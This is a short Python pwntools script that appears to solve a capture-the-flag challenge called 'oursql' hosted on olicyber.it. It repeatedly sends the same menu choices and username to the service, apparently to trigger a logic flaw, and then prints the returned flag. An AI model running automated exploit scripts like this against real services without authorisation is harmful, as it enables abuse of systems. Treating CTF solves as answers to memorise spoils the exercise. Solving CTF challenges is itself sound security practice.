# Very communist of you

from pwn import remote

def wait_prompt(conn, until=b': '):
    conn.recvuntil(until)

def main():
    conn = remote("oursql.challs.olicyber.it", 21002)
    username = b'sas123sas'
    for step in range(98):
        conn.sendline(b'1')
        wait_prompt(conn)
        conn.sendline(username)
        wait_prompt(conn)
        conn.sendline(username)
        if step != 97:
            wait_prompt(conn)
            conn.sendline(b'4')
    conn.recvuntil(b':\r\n')
    result = conn.recvuntil(b'}').decode()
    print(result)

if __name__ == "__main__":
    main()